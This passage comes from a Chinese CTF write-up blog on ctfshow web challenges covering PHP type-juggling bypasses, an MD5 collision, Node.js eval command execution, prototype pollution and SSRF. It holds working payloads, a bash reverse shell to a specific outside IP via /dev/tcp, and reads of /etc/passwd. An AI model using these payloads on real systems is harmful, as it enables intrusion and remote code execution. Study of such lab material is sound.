class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>===<span class="string">&quot;4476&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-z]/i&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">strpos</span>(<span class="variable">$num</span>, <span class="string">&quot;0&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)===<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>先看题目，多了一个 !strpos($num, “0”) ， strpos() 函数<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E6%9F%A5%E6%89%BE%E5%AD%97%E7%AC%A6%E4%B8%B2&spm=1001.2101.3001.7020">查找字符串</a>在另一字符串中第一次出现的位置 ，这里要求是第一个字符不是0，其他和上题一样，可用4476.0绕过，或者在八进制前面加空格，或者 ?num&#x3D;+4476 。</p>
</blockquote>
<p>payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?num=4476.0</span><br><span class="line">?num= 010574</span><br><span class="line">?num=+4476.0</span><br></pre></td></tr></table></figure>

<h3 id="web95"><a href="#web95" class="headerlink" title="web95"></a>web95</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-z]|\./i&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">strpos</span>(<span class="variable">$num</span>, <span class="string">&quot;0&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)===<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?num= 010574</span><br><span class="line">?num=+010574</span><br><span class="line">AI写代码12</span><br></pre></td></tr></table></figure>

<h3 id="web96"><a href="#web96" class="headerlink" title="web96"></a>web96</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]==<span class="string">&#x27;flag.php&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>看题目，要求u不弱等于flag.php，然后高亮u。可以推断出，flag在当前目录下的flag.php文件中。</p>
<p>payload：</p>
<p>?u&#x3D;..&#x2F;html&#x2F;flag.php<br>?u&#x3D;.&#x2F;flag.php   &#x2F;&#x2F;相对路径，  .&#x2F;表示在当前目录下<br>?u&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php   &#x2F;&#x2F;伪协议<br>?u&#x3D;php:&#x2F;&#x2F;filter&#x2F;resource&#x3D;flag.php   &#x2F;&#x2F;伪协议<br>?u&#x3D;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php  &#x2F;&#x2F;绝对路径</p>
<h3 id="web97"><a href="#web97" class="headerlink" title="web97"></a>web97</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>] != <span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) === <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>]))</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">&#x27;Wrong.&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>payload：</p>
<p>a[]&#x3D;17&amp;b[]&#x3D;17  &#x2F;&#x2F;数组<br>a&#x3D;M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2<br>&amp;b&#x3D;M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2<br>&#x2F;&#x2F;强碰撞</p>
<h3 id="web98（看不懂源码看不懂解析）"><a href="#web98（看不懂源码看不懂解析）" class="headerlink" title="web98（看不懂源码看不懂解析）"></a>web98（看不懂源码看不懂解析）</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="variable">$_GET</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_POST</span>:<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_COOKIE</span>:<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_SERVER</span>:<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;HTTP_FLAG&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$flag</span>:<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>

<p>既然get传入的值会被定位指向到post所对应的值，那么只需要有get存在即可，同时post传入HTTP_FLAG&#x3D;flag就可以了 payload ?HTTP_FLAG&#x3D;随便输         &#x2F;&#x2F;GET HTTP_FLAG&#x3D;flag           &#x2F;&#x2F;POST</p>
<h3 id="web99"><a href="#web99" class="headerlink" title="web99"></a>web99</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$allow</span> = <span class="keyword">array</span>();</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">36</span>; <span class="variable">$i</span> &lt; <span class="number">0x36d</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line">    <span class="title function_ invoke__">array_push</span>(<span class="variable">$allow</span>, <span class="title function_ invoke__">rand</span>(<span class="number">1</span>,<span class="variable">$i</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;n&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">in_array</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;n&#x27;</span>], <span class="variable">$allow</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;n&#x27;</span>], <span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="web100"><a href="#web100" class="headerlink" title="web100"></a>web100</h3><h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><h3 id="web254"><a href="#web254" class="headerlink" title="web254"></a>web254</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkVip</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;isVip;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;password===<span class="variable">$p</span>)&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;isVip=<span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;isVip;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">vipOneKeyGetFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;isVip)&#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;your flag is &quot;</span>.<span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;no vip, no flag&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="variable">$user</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ctfShowUser</span>();</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">login</span>(<span class="variable">$username</span>,<span class="variable">$password</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">checkVip</span>())&#123;</span><br><span class="line">            <span class="variable">$user</span>-&gt;<span class="title function_ invoke__">vipOneKeyGetFlag</span>();</span><br></pre></td></tr></table></figure>







<h2 id="node-js"><a href="#node-js" class="headerlink" title="node.js"></a>node.js</h2><h3 id="web334"><a href="#web334" class="headerlink" title="web334"></a>web334</h3><p>附件给了源码 user.js login,js</p>
<p>user.js 中有用户名：CTFSHOW，密码：123456 4、审计 login.js，其中代码 return name!&#x3D;&#x3D;’CTFSHOW’ &amp;&amp; item.username &#x3D;&#x3D;&#x3D; name.toUpperCase() &amp;&amp; item.password &#x3D;&#x3D;&#x3D; password;，用户名输入小写 ctfshow</p>
<h3 id="web335"><a href="#web335" class="headerlink" title="web335"></a>web335</h3><p>页面发现 eval 参数的 get 传参</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?eval=require(&#x27;child_process&#x27;).execSync(&#x27;ls&#x27;)</span><br><span class="line">?eval=require(&#x27;child_process&#x27;).execSync(&#x27;tac fl00g.txt&#x27;)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">代码解释：</span><br><span class="line">require(&#x27;child_process&#x27;)：在 Node.js 里，child_process 是一个内置模块，require(&#x27;child_process&#x27;) 用于引入该模块，借助它可以创建子进程。</span><br><span class="line">spawnSync(&#x27;ls&#x27;, [&#x27;.&#x27;])：spawnSync 是 child_process 模块的同步方法，其作用是创建一个子进程并执行命令。这里执行的命令是 ls（在 Unix/Linux 系统下用于列出目录内容），参数是 .（表示当前目录）。</span><br><span class="line">.stdout.toString()：spawnSync 方法的返回值包含子进程的标准输出（stdout）等信息，stdout 是一个 Buffer 对象，toString() 方法把它转换为字符串。</span><br><span class="line">整体效果：当 Web 应用执行这个 eval() 代码时，会列出当前目录下的所有文件和文件夹。</span><br></pre></td></tr></table></figure>

<p>跟 SSTI 是固定模版，require 类似于 import，所以背就完事了，</p>
<h3 id="web336"><a href="#web336" class="headerlink" title="web336"></a>web336</h3><p>把上一题的 execSync 过滤了</p>
<p>过滤了 exec，其他不变</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">child_process.spawnSync(command[, args][, options])</span><br><span class="line"></span><br><span class="line">?eval=require(&#x27;child_process&#x27;).spawnSync(&#x27;ls&#x27;, [&#x27;-l&#x27;, &#x27;.&#x27;]).stdout</span><br><span class="line">?eval=require(&#x27;child_process&#x27;).spawnSync(&#x27;cat&#x27;, [&#x27;fl001g.txt&#x27;]).stdout</span><br></pre></td></tr></table></figure>

<p>其中的 stdout 表示缓冲区中的内容，也就是输出结果，也可以在结尾继续追加一个 toString()方法但是还可以用</p>
<p>or:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">检查发现过滤了 exec</span><br><span class="line">可以将命令 base64 编码，然后解码后再次 eval</span><br><span class="line"></span><br><span class="line">/?eval=eval(Buffer.from(&quot;cmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWNTeW5jKCdjYXQgZmwwMDFnLnR4dCcp&quot;,&#x27;base64&#x27;).toString(&#x27;ascii&#x27;))</span><br></pre></td></tr></table></figure>

<h3 id="web337"><a href="#web337" class="headerlink" title="web337"></a>web337</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if(a &amp;&amp; b &amp;&amp; a.length===b.length &amp;&amp; a!==b &amp;&amp; md5(a+flag)===md5(b+flag))&#123;</span><br><span class="line">	res.end(flag);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">	res.render(&#x27;index&#x27;,&#123; msg: &#x27;tql&#x27;&#125;);</span><br></pre></td></tr></table></figure>

<p><code>?a[a]=1&amp;b[b]=1</code><br>满足 a 和 b 都为真、a 和 b 长度相等、和字符串拼接的结果都是[object Object]flag</p>
<h3 id="web338"><a href="#web338" class="headerlink" title="web338"></a>web338</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">给了源码, 看到 login.js 里面有个 copy() 函数</span><br><span class="line"></span><br><span class="line">router.post(&#x27;/&#x27;, require(&#x27;body-parser&#x27;).json(),function(req, res, next) &#123;</span><br><span class="line">  res.type(&#x27;html&#x27;);</span><br><span class="line">  var flag=&#x27;flag_here&#x27;;</span><br><span class="line">  var secert = &#123;&#125;;</span><br><span class="line">  var sess = req.session;</span><br><span class="line">  let user = &#123;&#125;;</span><br><span class="line">  utils.copy(user,req.body);</span><br><span class="line">  if(secert.ctfshow===&#x27;36dboy&#x27;)&#123;</span><br><span class="line">    res.end(flag);</span><br><span class="line">  &#125;else&#123;</span><br><span class="line">    return res.json(&#123;ret_code: 2, ret_msg: &#x27;登录失败&#x27;+JSON.stringify(user)&#125;);  </span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">找到 copy() 函数的用法</span><br><span class="line"></span><br><span class="line">function copy(object1, object2)&#123;</span><br><span class="line">    for (let key in object2) &#123;</span><br><span class="line">        if (key in object2 &amp;&amp; key in object1) &#123;</span><br><span class="line">            copy(object1[key], object2[key])</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            object1[key] = object2[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>基础的原型链污染, 因为需要 满足条件 <code>secert.ctfshow===&#39;36dboy&#39; </code>, 可以输出 flag,<br>但是 secert 是否有 ctfshow 不重要, 让它的原型拥有就行,<br>secert 和 user 都是 对象, 在执行 copy 操作 ,构造一个请求体污染了 user 的原型,<br>存在一个 ctfshow 的属性, 值为 36dboy , 那么在 secert 的里面找不到 ctfshow 的属性. 就会往原型上去找, 从而满足<code>secert.ctfshow===&#39;36dboy&#39;</code> ,得到 flag<br>抓个登录的包, 修改一下就行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload:</span><br><span class="line">&#123;&quot;username&quot;:&quot;111&quot;,&quot;password&quot;:&quot;111&quot;,&quot;__proto__&quot;: &#123;&quot;ctfshow&quot;: &quot;36dboy&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>















<p>&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</p>
<h3 id="web339-变量覆盖-query"><a href="#web339-变量覆盖-query" class="headerlink" title="web339 变量覆盖 query"></a>web339 变量覆盖 query</h3><p>login.js</p>
<p>​&#96;&#96;&#96;javascript<br>router.post(‘&#x2F;‘, require(‘body-parser’).json(),function(req, res, next) {<br>  res.type(‘html’);<br>  var flag&#x3D;’flag_here’;<br>  var secert &#x3D; {};<br>  var sess &#x3D; req.session;<br>  let user &#x3D; {};<br>  utils.copy(user,req.body);<br>  if(secert.ctfshow&#x3D;&#x3D;&#x3D;flag){<br>    res.end(flag);<br>  }else{<br>    return res.json({ret_code: 2, ret_msg: ‘登录失败’+JSON.stringify(user)});<br>  }</p>
<p>});</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">api.js</span><br><span class="line"></span><br><span class="line">```javascript</span><br><span class="line">router.post(&#x27;/&#x27;, require(&#x27;body-parser&#x27;).json(),function(req, res, next) &#123;</span><br><span class="line">  res.type(&#x27;html&#x27;);</span><br><span class="line">  res.render(&#x27;api&#x27;, &#123; query: Function(query)(query)&#125;);  //函数名 query，参数 query</span><br><span class="line">   </span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>和上一题的区别在于，上一题判断语句是 if(secert.ctfshow&#x3D; &#x3D; &#x3D;‘36dboy’)，这题是 if(secert.ctfshow&#x3D; &#x3D; &#x3D;flag)，但是变量 flag 的值我们不知道，所以不能使用上一题的 payload 污染原型修改 secert.ctfshow。</p>
<p>通过 login.js 里的 utils.copy(user,req.body); 污染原型，然后访问 api 的时候由于 query 未定义，所以会向其原型找，那么通过污染原型构造恶意代码即可 rce。</p>
<p>![img](file:&#x2F;&#x2F;&#x2F;C:\Users\111\Documents\Tencent Files\2645958615\nt_qq\nt_data\Pic\2025-05\Ori\be7268db2dea4a7ca61ae7aebefabd9c.png)</p>
<h3 id="web340"><a href="#web340" class="headerlink" title="web340"></a>web340</h3><p>这一题从 userinfo 对象进行污染，userinfo 对象上一级是 user 对象，user 对象上一级就是 object，所以需要污染两次。</p>
<p>payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;query&quot;:&quot;return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/120.46.41.173/9023 0&gt;&amp;1\&quot;&#x27;)&quot;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>记得 POST 发包调成 json 格式。</p>
<p>环境变量中找到 flag</p>
<p>就是我们能控制的是 userinfo,但是 userinfo 上一级是 user,user 的上一级才是 object,才能影响到’api’, { query: Function(query)(query)}</p>
<figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;__proto__&quot;</span>:&#123;<span class="string">&quot;__proto__&quot;</span>:&#123;<span class="string">&quot;query&quot;</span>:<span class="string">&quot;return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).exec(&#x27;bash -c <span class="subst">\&quot;</span>bash -i &gt;&amp; /dev/tcp/ip/端口 0&gt;&amp;1<span class="subst">\&quot;</span>&#x27;)&quot;</span>&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>剩下的步骤和上面一样</p>
<p>我咋知道我能控制的是什么？我怎么知道“地位”？</p>
<h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><h3 id="web351"><a href="#web351" class="headerlink" title="web351"></a>web351</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">$url=$_POST [&#x27;url&#x27;];</span><br><span class="line">$ch=curl_init($ url);</span><br><span class="line">curl_setopt($ch, CURLOPT_HEADER, 0);</span><br><span class="line">curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);</span><br><span class="line">$result=curl_exec($ ch);</span><br><span class="line">curl_close($ch);</span><br><span class="line">echo ($result);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>url &#x3D; <a target="_blank" rel="noopener" href="http://127.0.0.1/flag.php">http://127.0.0.1/flag.php</a><br>url &#x3D; localhost&#x2F;flag.php<br>url &#x3D; 127.0.0.1&#x2F;flag.php</p>
<p>url &#x3D; file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php(在源代码)</p>
<p>尝试 post 传入 url，并使用 file 协议作为参数，file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd 有返回值。 然后猜测 flag 在当前目录，而当前目录一般都是&#x2F;var&#x2F;www&#x2F;html 故传入 file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php</p>
<p>两个问题等你写</p>
<p>curl_exec 的特性</p>
<p>本题最后一个 payload 有什么不同，为什么可以绕过本地限制</p>
<p><strong>答案：</strong></p>
<ol>
